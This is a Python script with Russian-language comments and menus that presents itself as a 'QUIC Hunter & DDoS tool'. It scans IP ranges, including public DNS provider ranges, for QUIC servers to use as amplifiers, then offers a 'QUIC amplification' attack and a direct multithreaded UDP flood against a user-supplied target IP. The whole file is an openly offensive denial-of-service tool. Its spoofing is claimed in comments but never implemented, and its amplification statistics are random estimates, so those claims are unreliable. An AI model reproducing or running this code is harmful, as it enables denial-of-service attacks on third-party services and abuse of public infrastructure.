#!/usr/bin/env python3

import socket
import struct
import random
import threading
import time
import argparse
import ipaddress
import requests
import json
import os
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

class QUICHunter:
    def __init__(self, max_threads=1000):
        self.max_threads = max_threads
        self.quic_servers = []
        self.found_servers = []
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]

    def generate_quic_initial_packet(self, dest_ip, dest_port=443, version=1):
        """Генерирует QUIC Initial packet"""
        try:
            # QUIC Header (Short header)
            header = b''
            header += b'\x80'  # Header form (1) + Fixed bit (1) + Spin bit (0) + Reserved bits (00) + Key phase (0) + Packet number length (00)
            header += b'\x00\x00\x00\x01'  # Connection ID (упрощенный)
            header += b'\x00'  # Packet number (1 byte)
            
            # QUIC Initial packet payload (фейковые крипто данные)
            payload = os.urandom(1200)  # Стандартный MTU размер
            
            return header + payload
        except Exception as e:
            print(f"❌ Ошибка генерации QUIC пакета: {e}")
            return None

    def test_quic_server(self, ip, port=443, timeout=5):
        """Тестирует сервер на поддержку QUIC"""
        try:
            # Создаем UDP сокет
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            
            # Отправляем QUIC Initial packet
            quic_packet = self.generate_quic_initial_packet(ip, port)
            if not quic_packet:
                return False
                
            sock.sendto(quic_packet, (ip, port))
            
            # Пытаемся получить ответ
            try:
                response, addr = sock.recvfrom(4096)
                sock.close()
                
                # Анализируем ответ
                if self.is_quic_response(response):
                    print(f"✅ Найден QUIC сервер: {ip}:{port}")
                    return True
                else:
                    return False
                    
            except socket.timeout:
                # Таймаут - возможно сервер не поддерживает QUIC
                sock.close()
                return False
                
        except Exception as e:
            return False

    def is_quic_response(self, data):
        """Проверяет, является ли ответ QUIC пакетом"""
        if len(data) < 5:
            return False
            
        # Проверяем QUIC signature
        first_byte = data[0]
        
        # QUIC packets have specific bit patterns
        if first_byte & 0x80:  # Long header
            return True
        elif first_byte & 0x40:  # Short header
            return True
        elif b'quic' in data.lower() or b'http/3' in data.lower():
            return True
            
        return False

    def scan_ip_range(self, ip_range, ports=[443, 8443, 4433], max_ips=1000):
        """Сканирует диапазон IP на наличие QUIC серверов"""
        print(f"🔍 Сканирование диапазона {ip_range} на QUIC серверы...")
        
        try:
            network = ipaddress.ip_network(ip_range, strict=False)
            ips_to_scan = list(network.hosts())[:max_ips]
        except:
            print(f"❌ Неверный IP диапазон: {ip_range}")
            return []

        found_servers = []
        scanned = 0
        
        def scan_single_ip(ip):
            nonlocal scanned
            for port in ports:
                if self.test_quic_server(str(ip), port):
                    found_servers.append((str(ip), port))
                    break
            scanned += 1
            if scanned % 100 == 0:
                print(f"📊 Просканировано: {scanned}/{len(ips_to_scan)} IP")

        with ThreadPoolExecutor(max_workers=min(self.max_threads, 100)) as executor:
            list(executor.map(scan_single_ip, ips_to_scan))
        
        print(f"✅ Найдено QUIC серверов: {len(found_servers)}")
        return found_servers

    def scan_from_file(self, filename="range.txt"):
        """Сканирует диапазоны из файла range.txt"""
        if not os.path.exists(filename):
            print(f"❌ Файл {filename} не найден! Создаю пример...")
            self.create_example_range_file(filename)
            return []

        found_servers = []
        
        with open(filename, 'r') as f:
            lines = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        
        print(f"📁 Загружено {len(lines)} диапазонов из {filename}")
        
        for i, line in enumerate(lines):
            print(f"\n📡 Сканирование {i+1}/{len(lines)}: {line}")
            servers = self.scan_ip_range(line)
            found_servers.extend(servers)
            time.sleep(1)  # Пауза между диапазонами
        
        return found_servers

    def create_example_range_file(self, filename="range.txt"):
        """Создает пример файла с диапазонами"""
        example_ranges = [
            "# Пример файла диапазонов для сканирования",
            "# Каждая строка - CIDR диапазон",
            "1.1.1.0/24",
            "8.8.8.0/24", 
            "9.9.9.0/24",
            "208.67.222.0/24",
            "185.228.168.0/24"
        ]
        
        with open(filename, 'w') as f:
            for line in example_ranges:
                f.write(line + '\n')
        
        print(f"✅ Создан пример файла {filename}")

    def load_quic_servers_from_file(self, filename="quic_servers.txt"):
        """Загружает QUIC серверы из файла"""
        servers = []
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        if ':' in line:
                            parts = line.split(':')
                            ip, port = parts[0], int(parts[1])
                            servers.append((ip, port))
                        else:
                            servers.append((line, 443))
            print(f"✅ Загружено {len(servers)} QUIC серверов из {filename}")
        return servers

    def save_quic_servers(self, servers, filename="quic_servers.txt"):
        """Сохраняет найденные QUIC серверы в файл"""
        with open(filename, 'w') as f:
            f.write("# QUIC серверы для амплификации\n")
            f.write("# Обновлено: " + time.strftime("%Y-%m-%d %H:%M:%S") + "\n\n")
            for server in servers:
                if len(server) == 3:  # с доменом
                    ip, port, domain = server
                    f.write(f"{ip}:{port} # {domain}\n")
                else:  # только IP:port
                    ip, port = server
                    f.write(f"{ip}:{port}\n")
        print(f"💾 Сохранено {len(servers)} QUIC серверов в {filename}")

class QUICDDoSAttack:
    def __init__(self, max_threads=1000):
        self.max_threads = max_threads
        self.quic_amplifiers = []
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'amplified_bytes': 0,
            'start_time': time.time()
        }

    def load_amplifiers(self, filename="quic_servers.txt"):
        """Загружает QUIC усилители"""
        self.quic_amplifiers = []
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        if ':' in line:
                            parts = line.split(':')
                            ip, port = parts[0], int(parts[1])
                            self.quic_amplifiers.append((ip, port))
                        else:
                            self.quic_amplifiers.append((line, 443))
            print(f"✅ Загружено {len(self.quic_amplifiers)} QUIC усилителей")
        else:
            print(f"❌ Файл {filename} не найден! Сначала найдите QUIC серверы.")
        return self.quic_amplifiers

    def generate_quic_amplification_packet(self, target_ip):
        """Генерирует QUIC пакет для амплификации"""
        try:
            # Long Header QUIC packet (вызывает большие ответы)
            header = b''
            header += b'\xc0'  # Header form (1) + Fixed bit (1) + Long packet type (10)
            header += b'\x00\x00\x00\x01'  # Version
            header += b'\x08'  # DCID length
            header += os.urandom(8)  # Destination Connection ID
            header += b'\x00'  # SCID length
            header += b'\x00'  # Packet number
            
            # Crypto frame (вызывает крипто-negotiation = большой ответ)
            crypto_frame = b''
            crypto_frame += b'\x06'  # Crypto frame type
            crypto_frame += b'\x00\x01'  # Offset
            crypto_frame += b'\x04\x00'  # Length (1024 bytes)
            crypto_frame += os.urandom(1024)  # Crypto data
            
            return header + crypto_frame
            
        except Exception as e:
            print(f"❌ Ошибка генерации QUIC amplification пакета: {e}")
            return None

    def quic_amplification_attack(self, target_ip, target_port=443, duration=60):
        """QUIC Amplification атака"""
        print(f"💥 ЗАПУСК QUIC AMPLIFICATION НА {target_ip}:{target_port}")
        
        if not self.quic_amplifiers:
            print("❌ Нет QUIC усилителей! Сначала найдите серверы.")
            return 0

        attack_stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'estimated_amplified_bytes': 0,
            'failed_packets': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def amplification_worker(worker_id):
            packets_sent = 0
            bytes_sent = 0
            estimated_amplified = 0
            
            try:
                print(f"🌐 Воркер {worker_id} начинает QUIC amplification...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Выбираем случайный QUIC усилитель
                        amplifier_ip, amplifier_port = random.choice(self.quic_amplifiers)
                        
                        # Создаем UDP сокет для спуфинга
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        sock.settimeout(1)
                        
                        # Генерируем amplification пакет
                        quic_packet = self.generate_quic_amplification_packet(target_ip)
                        if not quic_packet:
                            continue
                        
                        # Отправляем с спуфингом IP цели
                        sock.sendto(quic_packet, (amplifier_ip, amplifier_port))
                        
                        packets_sent += 1
                        bytes_sent += len(quic_packet)
                        
                        # QUIC amplification factor ~10-50x
                        amplification_factor = random.randint(10, 50)
                        estimated_amplified += len(quic_packet) * amplification_factor
                        
                        attack_stats['packets_sent'] += 1
                        attack_stats['bytes_sent'] += len(quic_packet)
                        attack_stats['estimated_amplified_bytes'] += len(quic_packet) * amplification_factor
                        
                        sock.close()
                        
                        # Высокая скорость
                        time.sleep(0.01)
                        
                    except Exception:
                        attack_stats['failed_packets'] += 1
                        continue
                
                return packets_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка воркера {worker_id}: {e}")
                return 0, 0

        # Запускаем воркеры
        with ThreadPoolExecutor(max_workers=min(self.max_threads, 500)) as executor:
            futures = [executor.submit(amplification_worker, i) for i in range(min(self.max_threads, 500))]
            
            total_packets = 0
            total_bytes = 0
            
            for future in as_completed(futures):
                try:
                    packets, bytes_sent = future.result(timeout=duration + 10)
                    total_packets += packets
                    total_bytes += bytes_sent
                except:
                    pass

        attack_stats['is_running'] = False
        
        # Статистика
        attack_duration = time.time() - attack_stats['start_time']
        print(f"\n📊 QUIC AMPLIFICATION РЕЗУЛЬТАТЫ:")
        print(f"🎯 Цель: {target_ip}:{target_port}")
        print(f"📦 Пакетов отправлено: {attack_stats['packets_sent']:,}")
        print(f"💾 Данных отправлено: {attack_stats['bytes_sent'] / 1024 / 1024:.2f} MB")
        print(f"💥 Оценка усиленного трафика: {attack_stats['estimated_amplified_bytes'] / 1024 / 1024:.2f} MB")
        print(f"⚡ Усиление: ~{attack_stats['estimated_amplified_bytes'] / max(attack_stats['bytes_sent'], 1):.1f}x")
        print(f"❌ Ошибок: {attack_stats['failed_packets']}")

        return attack_stats['packets_sent']

    def quic_direct_flood(self, target_ip, target_port=443, duration=60):
        """Прямой QUIC flood на цель"""
        print(f"🌊 ПРЯМОЙ QUIC FLOOD НА {target_ip}:{target_port}")
        
        attack_stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'failed_packets': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def direct_flood_worker(worker_id):
            packets_sent = 0
            bytes_sent = 0
            
            try:
                print(f"🎯 Воркер {worker_id} начинает прямой QUIC flood...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        sock.settimeout(0.5)
                        
                        # Разные типы QUIC пакетов
                        packet_types = ['initial', 'handshake', 'zero_rtt']
                        packet_type = random.choice(packet_types)
                        
                        quic_packet = self.generate_quic_packet_by_type(packet_type, target_ip)
                        if quic_packet:
                            sock.sendto(quic_packet, (target_ip, target_port))
                            
                            packets_sent += 1
                            bytes_sent += len(quic_packet)
                            
                            attack_stats['packets_sent'] += 1
                            attack_stats['bytes_sent'] += len(quic_packet)
                        
                        sock.close()
                        
                        # Максимальная скорость
                        time.sleep(0.001)
                        
                    except Exception:
                        attack_stats['failed_packets'] += 1
                        continue
                
                return packets_sent, bytes_sent
                
            except Exception as e:
                return 0, 0

        # Запускаем воркеры
        with ThreadPoolExecutor(max_workers=min(self.max_threads, 1000)) as executor:
            futures = [executor.submit(direct_flood_worker, i) for i in range(min(self.max_threads, 1000))]
            
            total_packets = 0
            total_bytes = 0
            
            for future in as_completed(futures):
                try:
                    packets, bytes_sent = future.result(timeout=duration + 10)
                    total_packets += packets
                    total_bytes += bytes_sent
                except:
                    pass

        attack_stats['is_running'] = False
        
        # Статистика
        attack_duration = time.time() - attack_stats['start_time']
        print(f"\n📊 ПРЯМОЙ QUIC FLOOD РЕЗУЛЬТАТЫ:")
        print(f"🎯 Цель: {target_ip}:{target_port}")
        print(f"📦 QUIC пакетов: {attack_stats['packets_sent']:,}")
        print(f"💾 Данных: {attack_stats['bytes_sent'] / 1024 / 1024:.2f} MB")
        print(f"⚡ Скорость: {attack_stats['packets_sent'] / max(attack_duration, 1):.0f} pkt/сек")
        print(f"❌ Ошибок: {attack_stats['failed_packets']}")

        return attack_stats['packets_sent']

    def generate_quic_packet_by_type(self, packet_type, target_ip):
        """Генерирует разные типы QUIC пакетов"""
        if packet_type == 'initial':
            return self.generate_quic_initial_packet(target_ip)
        elif packet_type == 'handshake':
            return self.generate_quic_handshake_packet(target_ip)
        else:  # zero_rtt
            return self.generate_quic_zerortt_packet(target_ip)

    def generate_quic_initial_packet(self, target_ip):
        """Генерирует QUIC Initial packet"""
        header = b'\xc0'  # Long header
        header += b'\x00\x00\x00\x01'  # Version
        header += b'\x08'  # DCID length
        header += os.urandom(8)
        header += b'\x00'  # SCID length
        header += b'\x00'  # Packet number
        return header + os.urandom(800)

    def generate_quic_handshake_packet(self, target_ip):
        """Генерирует QUIC Handshake packet"""
        header = b'\xc0'  # Long header
        header += b'\x00\x00\x00\x01'  # Version
        header += b'\x08'  # DCID length
        header += os.urandom(8)
        header += b'\x00'  # SCID length
        header += b'\x00'  # Packet number
        return header + os.urandom(1000)

    def generate_quic_zerortt_packet(self, target_ip):
        """Генерирует QUIC 0-RTT packet"""
        header = b'\xd0'  # 0-RTT packet
        header += b'\x00\x00\x00\x01'  # Version
        header += b'\x08'  # DCID length
        header += os.urandom(8)
        header += b'\x00'  # Packet number
        return header + os.urandom(800)

def show_menu():
    """Показывает главное меню"""
    print("┌" + "─" * 50 + "┐")
    print("│              🚀 QUIC HUNTER & DDoS TOOL            │")
    print("├" + "─" * 50 + "┤")
    print("│ 1. 🔍 Найти QUIC серверы (из range.txt)           │")
    print("│ 2. 💥 QUIC Amplification атака                   │")
    print("│ 3. 🌊 Прямой QUIC Flood                          │")
    print("│ 4. 📊 Показать найденные серверы                 │")
    print("│ 5. 🛠️  Создать пример range.txt                  │")
    print("│ 0. ❌ Выход                                      │")
    print("└" + "─" * 50 + "┘")

def main():
    hunter = QUICHunter()
    attacker = QUICDDoSAttack()
    
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        show_menu()
        
        choice = input("\n🎯 Выберите действие: ").strip()
        
        if choice == '1':
            print("\n🔍 Поиск QUIC серверов из range.txt...")
            found_servers = hunter.scan_from_file()
            if found_servers:
                hunter.save_quic_servers(found_servers)
                input("\n✅ Нажмите Enter для продолжения...")
            else:
                print("❌ QUIC серверы не найдены")
                input("\n⏸️ Нажмите Enter для продолжения...")
                
        elif choice == '2':
            target = input("🎯 Введите IP цель: ").strip()
            if not target:
                print("❌ Не указана цель!")
                input("\n⏸️ Нажмите Enter для продолжения...")
                continue
                
            port = input("🎯 Введите порт (по умолчанию 443): ").strip()
            port = int(port) if port.isdigit() else 443
            
            duration = input("⏱️ Длительность атаки в секундах (по умолчанию 60): ").strip()
            duration = int(duration) if duration.isdigit() else 60
            
            print(f"\n💥 Запуск QUIC Amplification на {target}:{port}...")
            attacker.load_amplifiers()
            attacker.quic_amplification_attack(target, port, duration)
            input("\n⏸️ Нажмите Enter для продолжения...")
            
        elif choice == '3':
            target = input("🎯 Введите IP цель: ").strip()
            if not target:
                print("❌ Не указана цель!")
                input("\n⏸️ Нажмите Enter для продолжения...")
                continue
                
            port = input("🎯 Введите порт (по умолчанию 443): ").strip()
            port = int(port) if port.isdigit() else 443
            
            duration = input("⏱️ Длительность атаки в секундах (по умолчанию 60): ").strip()
            duration = int(duration) if duration.isdigit() else 60
            
            print(f"\n🌊 Запуск прямого QUIC Flood на {target}:{port}...")
            attacker.quic_direct_flood(target, port, duration)
            input("\n⏸️ Нажмите Enter для продолжения...")
            
        elif choice == '4':
            servers = hunter.load_quic_servers_from_file()
            if servers:
                print(f"\n📊 Найдено {len(servers)} QUIC серверов:")
                for i, (ip, port) in enumerate(servers[:20], 1):
                    print(f"  {i}. {ip}:{port}")
                if len(servers) > 20:
                    print(f"  ... и еще {len(servers) - 20} серверов")
            else:
                print("❌ QUIC серверы не найдены")
            input("\n⏸️ Нажмите Enter для продолжения...")
            
        elif choice == '5':
            hunter.create_example_range_file()
            print("✅ Пример range.txt создан!")
            input("\n⏸️ Нажмите Enter для продолжения...")
            
        elif choice == '0':
            print("👋 До свидания!")
            break
            
        else:
            print("❌ Неверный выбор!")
            input("\n⏸️ Нажмите Enter для продолжения...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n👋 Программа завершена пользователем")
    except Exception as e:
        print(f"💥 Критическая ошибка: {e}")